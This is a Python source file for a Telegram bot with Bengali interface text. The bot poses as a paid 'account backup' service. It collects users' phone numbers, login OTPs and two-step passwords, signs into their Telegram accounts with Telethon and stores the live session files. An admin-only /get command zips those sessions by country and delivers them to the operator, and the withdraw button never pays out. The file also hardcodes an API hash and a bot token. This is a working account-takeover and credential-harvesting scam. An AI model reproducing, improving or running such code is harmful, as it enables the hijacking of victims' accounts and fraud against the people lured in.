import os
import asyncio
import zipfile
import json
from threading import Thread
from flask import Flask
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

# ==================== কনফিগারেশন ====================
API_ID = 36547444
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"
ADMIN_ID = 8095751648

# প্রতি সফল ব্যাকআপের জন্য ইউজার কত ডলার পাবে (যেমন: ০.১০ ডলার)
REWARD_PER_BACKUP = 0.10

# দেশ ভিত্তিক ফাইল জমার সর্বোচ্চ ক্যাপাসিটি (এডমিন এখান থেকে পরিবর্তন করতে পারবেন)
COUNTRY_CAPACITY = {
    "880": 10,   # বাংলাদেশ (সর্বোচ্চ ১০টি)
    "91": 100,   # ইন্ডিয়া (সর্বোচ্চ ১০০টি)
    "57": 100,   # কলম্বিয়া (সর্বোচ্চ ১০০টি)
    "default": 50 # তালিকায় না থাকা অন্যান্য দেশের জন্য ডিফল্ট ক্যাপাসিটি
}
# ===================================================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
app = Flask(__name__)

BASE_STORAGE_DIR = "user_backups"
DB_FILE = "user_database.json"

if not os.path.exists(BASE_STORAGE_DIR):
    os.makedirs(BASE_STORAGE_DIR)

user_data = {}

# ইউজার ডাটাবেস (ব্যালেন্স সেভ রাখার জন্য) লোড ও সেভ করার ফাংশন
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_db(db):
    with open(DB_FILE, "w") as f:
        json.dump(db, f, indent=4)

def get_user_balance(user_id):
    db = load_db()
    return db.get(str(user_id), {}).get("balance", 0.0)

def add_user_balance(user_id, amount):
    db = load_db()
    uid_str = str(user_id)
    if uid_str not in db:
        db[uid_str] = {"balance": 0.0}
    db[uid_str]["balance"] = round(db[uid_str]["balance"] + amount, 2)
    save_db(db)

# দেশের ফোল্ডারে বর্তমানে কয়টি ফাইল আছে গণনার ফাংশন
def get_current_file_count(country_code):
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir):
        return 0
    return len([f for f in os.listdir(target_dir) if f.endswith(".session")])

@app.route('/')
def home():
    return "Bot is running perfectly!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# ওয়েব পোর্ট সচল রাখার থ্রেড
Thread(target=run_web, daemon=True).start()

# অ্যাসিনক্রোনাস ইভেন্ট লুপ সেটআপ
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# কান্ট্রি কোড এক্সট্রাক্ট করার ফাংশন
def get_country_code(phone_number):
    clean = phone_number.replace("+", "").replace(" ", "")
    if clean.startswith("880"): return "880"
    if clean.startswith("91"): return "91"
    if clean.startswith("57"): return "57"
    if clean.startswith("1"): return "1"
    if clean.startswith("44"): return "44"
    if clean.startswith("7"): return "7"
    return clean[:3]

# ইউজারদের জন্য মেইন কীবোর্ড বাটন
def get_user_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_profile = types.KeyboardButton("👤 My Profile")
    btn_withdraw = types.KeyboardButton("💳 Withdraw")
    btn_capacity = types.KeyboardButton("📊 Capacity")
    btn_cancel = types.KeyboardButton("❌ Cancel")
    markup.add(btn_profile, btn_withdraw, btn_capacity, btn_cancel)
    return markup

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        bot.reply_to(
            message,
            "👋 *স্বাগতম এডমিন ভাই!*\n\n"
            "📊 দেশের কোড ভিত্তিক স্টোরেজ চেক করতে লিখুন: `/status [কান্ট্রি_কোড]` (যেমন: `/status 880`)\n"
            "📦 দেশ ভিত্তিক নির্দিষ্ট ফাইল নামাতে লিখুন: `/get [কান্ট্রি_কোড] [ফাইলের_সংখ্যা]` (যেমন: `/get 880 5`)\n\n"
            "বট আপনার আদেশের অপেক্ষায় আছে! 🔥"
        )
    else:
        bot.send_message(
            message.chat.id,
            "👋 *স্বাগতম!*\n\n"
            "আপনার টেলিগ্রাম আইডির একটি জিপ ফাইল ব্যাকআপ তৈরি করতে "
            "আপনার ফোন নম্বরটি আন্তর্জাতিক ফরম্যাটে পাঠান (যেমন: `+88017XXXXXXXX`) অথবা নিচের বোবামগুলো ব্যবহার করুন।",
            reply_markup=get_user_keyboard()
        )

# ওটিপি পাঠানোর অ্যাসিনক্রোনাস টাস্ক
async def send_otp_task(phone_number, user_id, message):
    country_code = get_country_code(phone_number)
    
    # ক্যাপাসিটি চেক লজিক (এডমিন কন্ট্রোল)
    max_capacity = COUNTRY_CAPACITY.get(country_code, COUNTRY_CAPACITY["default"])
    current_count = get_current_file_count(country_code)
    
    if current_count >= max_capacity:
        bot.reply_to(message, f"❌ **Capacity Over!**\n\nদুঃখিত, এই মুহূর্তে দেশ কোড `+{country_code}` এর জন্য আমাদের সার্ভার স্টোরেজ সম্পূর্ণ ফুল। অনুগ্রহ করে পরে চেষ্টা করুন।")
        return

    clean_phone = phone_number.replace("+", "").replace(" ", "")
    country_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(country_dir):
        os.makedirs(country_dir)
        
    final_session_path = os.path.join(country_dir, f"+{clean_phone}")
    
    user_client = TelegramClient(final_session_path, API_ID, API_HASH)
    await user_client.connect()
    
    try:
        sent_code = await user_client.send_code_request(phone_number)
        user_data[user_id] = {
            "client": user_client, "phone": phone_number,
            "phone_code_hash": sent_code.phone_code_hash,
            "clean_phone": clean_phone, "session_path": final_session_path,
            "country_code": country_code, "country_dir": country_dir
        }
        bot.reply_to(message, "📨 আপনার টেলিগ্রাম অ্যাপে যাওয়া ওটিপি কোডটি (OTP) এখানে পাঠান।")
    except Exception as e:
        bot.reply_to(message, f"❌ ওটিপি পাঠানো যায়নি: {str(e)}")
        await user_client.disconnect()
        if os.path.exists(f"{final_session_path}.session"):
            os.remove(f"{final_session_path}.session")

async def verify_otp_task(text, user_id, message):
    data = user_data[user_id]
    user_client = data["client"]
    
    if data.get("waiting_for_password"):
        try:
            await user_client.sign_in(password=text)
            await user_client.disconnect()
            
            # সফল ব্যাকআপের জন্য ব্যালেন্স যোগ করা
            add_user_balance(user_id, REWARD_PER_BACKUP)
            current_bal = get_user_balance(user_id)
            
            bot.reply_to(message, f"✅ অ্যাকাউন্টটি সফলভাবে যুক্ত ও ব্যাকআপ করা হয়েছে!\n💰 আপনার অ্যাকাউন্টে **${REWARD_PER_BACKUP}** যোগ করা হয়েছে। বর্তমান ব্যালেন্স: **${current_bal}**", reply_markup=get_user_keyboard())
            bot.send_message(ADMIN_ID, f"🔔 **নতুন ব্যাকআপ সফল!**\n🌍 দেশ কোড: `{data['country_code']}`\n📱 নম্বর: `+{data['clean_phone']}`\n💾 ডেমো ফরম্যাটে স্টোরেজে সেশন ফাইলটি সংরক্ষণ করা হয়েছে।")
            del user_data[user_id]
        except Exception as e:
            bot.reply_to(message, f"❌ ভুল পাসওয়ার্ড বা সমস্যা: {str(e)}\nআবার চেষ্টা করুন:")
    else:
        bot.reply_to(message, "⚙️ ভেরিফাই করা হচ্ছে...")
        try:
            await user_client.sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
            await user_client.disconnect()
            
            # সফল ব্যাকআপের জন্য ব্যালেন্স যোগ করা
            add_user_balance(user_id, REWARD_PER_BACKUP)
            current_bal = get_user_balance(user_id)
            
            bot.reply_to(message, f"✅ অ্যাকাউন্টটি সফলভাবে যুক্ত ও ব্যাকআপ করা হয়েছে!\n💰 আপনার অ্যাকাউন্টে **${REWARD_PER_BACKUP}** যোগ করা হয়েছে। বর্তমান ব্যালেন্স: **${current_bal}**", reply_markup=get_user_keyboard())
            bot.send_message(ADMIN_ID, f"🔔 **নতুন ব্যাকআপ সফল!**\n🌍 দেশ কোড: `{data['country_code']}`\n📱 নম্বর: `+{data['clean_phone']}`\n💾 ডেমো ফরম্যাটে স্টোরেজে সেশন ফাইলটি সংরক্ষণ করা হয়েছে।")
            del user_data[user_id]
        except SessionPasswordNeededError:
            bot.reply_to(message, "🔐 Two-Step Verification অন আছে। দয়া করে পাসওয়ার্ডটি দিন:")
            user_data[user_id]["waiting_for_password"] = True
        except Exception as e:
            bot.reply_to(message, f"❌ লগইন ব্যর্থ: {str(e)}")
            await user_client.disconnect()
            if os.path.exists(f"{data['session_path']}.session"):
                os.remove(f"{data['session_path']}.session")
            del user_data[user_id]

# এডমিন কম্যান্ড হ্যান্ডলার (স্ট্যাটাস চেক)
@bot.message_handler(commands=['status'])
def status_command(message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ ফরম্যাট: `/status [কান্ট্রি_কোড]` (যেমন: `/status 880`)")
        return
    
    country_code = args[1].replace("+", "").strip()
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    
    max_cap = COUNTRY_CAPACITY.get(country_code, COUNTRY_CAPACITY["default"])
    current_count = get_current_file_count(country_code)
        
    bot.reply_to(message, f"📊 **দেশ কোড `+{country_code}` স্ট্যাটাস:**\n\n📁 মোট সেশন জমা: **{current_count}টি**\n⚙️ সর্বোচ্চ ক্যাপাসিটি লিমিট: **{max_cap}টি**")

# এডমিন কম্যান্ড (গেট ফাইল)
@bot.message_handler(commands=['get'])
def get_files(message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    
    if len(args) < 3:
        bot.reply_to(message, "❌ সঠিক ফরম্যাট: `/get [কান্ট্রি_কোড] [ফাইলের_সংখ্যা]`")
        return
        
    country_code = args[1].replace("+", "").strip()
    try:
        count = int(args[2])
    except ValueError:
        bot.reply_to(message, "❌ ফাইলের সংখ্যাটি অবশ্যই একটি সংখ্যা হতে হবে।")
        return

    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir):
        bot.reply_to(message, f"❌ দেশ কোড `{country_code}`-এর কোনো ফাইল স্টোরেজে নেই।")
        return
        
    all_sessions = sorted([f for f in os.listdir(target_dir) if f.endswith(".session")])
    if not all_sessions:
        bot.reply_to(message, f"❌ দেশ কোড `{country_code}` ফোল্ডারে কোনো সেশন ফাইল নেই।")
        return
    
    files_to_take = all_sessions[:count]
    actual_count = len(files_to_take)
    bot.reply_to(message, f"📦 দেশ কোড `{country_code}` থেকে {actual_count}টি ফাইল প্রসেস করা হচ্ছে...")
    
    master_zip_name = f"Country_{country_code}_Fetch_{actual_count}_files.zip"
    try:
        with zipfile.ZipFile(master_zip_name, 'w') as master_zip:
            for file_name in files_to_take:
                file_path = os.path.join(target_dir, file_name)
                master_zip.write(file_path, arcname=file_name)
                os.remove(file_path)
        with open(master_zip_name, 'rb') as doc:
            bot.send_document(message.chat.id, doc, caption=f"✅ দেশ কোড `+{country_code}`-এর সফলভাবে {actual_count}টি ফাইল পাঠানো হলো।")
    except Exception as e:
        bot.reply_to(message, f"❌ সমস্যা হয়েছে: {str(e)}")
    finally:
        if os.path.exists(master_zip_name):
            os.remove(master_zip_name)

# টেক্সট এবং বাটন হ্যান্ডলার
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()
    username = message.from_user.username if message.from_user.username else "নেই"

    if text == "👤 My Profile":
        balance = get_user_balance(user_id)
        profile_text = (
            f"👤 **আপনার প্রোফাইল**\n\n"
            f"🆔 ইউজার আইডি: `{user_id}`\n"
            f"🌐 টেলিগ্রাম আইডি (Username): @{username}\n"
            f"💰 মোট ব্যালেন্স: **${balance}**\n\n"
            f"📌 প্রতি সফল ব্যাকআপে আপনি পাবেন **${REWARD_PER_BACKUP}**!"
        )
        bot.reply_to(message, profile_text)
        return
        
    elif text == "💳 Withdraw":
        bot.reply_to(message, "💳 *উইথড্র রিকোয়েস্ট*\n\n❌ দুঃখিত, বর্তমানে আপনার ব্যালেন্স পর্যাপ্ত নয় অথবা উইথড্র সিস্টেমটি বন্ধ আছে।")
        return
        
    elif text == "📊 Capacity":
        # প্রধান তিনটি দেশের বর্তমান স্ট্যাটাস ও ক্যাপাসিটি দেখানো
        bd_count = get_current_file_count("880")
        in_count = get_current_file_count("91")
        co_count = get_current_file_count("57")
        
        capacity_text = (
            f"📊 **সার্ভার ক্যাপাসিটি স্ট্যাটাস**\n\n"
            f"🇧🇩 বাংলাদেশ: `{bd_count}/{COUNTRY_CAPACITY['880']}`টি স্টোর করা যাবে।\n"
            f"🇮🇳 ইন্ডিয়া: `{in_count}/{COUNTRY_CAPACITY['91']}`টি স্টোর করা যাবে।\n"
            f"🇨🇴 কলম্বিয়া: `{co_count}/{COUNTRY_CAPACITY['57']}`টি স্টোর করা যাবে।\n\n"
            f"⚠️ কোনো দেশের ফাইল ফুল হয়ে গেলে সেখানে সাময়িকভাবে ব্যাকআপ বন্ধ দেখাবে।"
        )
        bot.reply_to(message, capacity_text)
        return
        
    elif text == "❌ Cancel":
        if user_id in user_data:
            del user_data[user_id]
        bot.reply_to(message, "❌ বর্তমান প্রসেসটি বাতিল করা হয়েছে। নতুন করে শুরু করতে /start দিন।", reply_markup=get_user_keyboard())
        return

    if user_id == ADMIN_ID and not text.startswith("+") and user_id not in user_data:
        return

    # ফোন নম্বর পাঠানো হলে
    if text.startswith("+"):
        bot.reply_to(message, "⏳ টেলিগ্রাম সার্ভারে ওটিপি পাঠানো হচ্ছে...")
        loop.run_until_complete(send_otp_task(text, user_id, message))

    # ওটিপি কোড পাঠানো হলে
    elif user_id in user_data and "phone_code_hash" in user_data[user_id]:
        loop.run_until_complete(verify_otp_task(text, user_id, message))

if __name__ == "__main__":
    print("--- Pro-Level Custom Architecture Active ---")
    bot.infinity_polling()
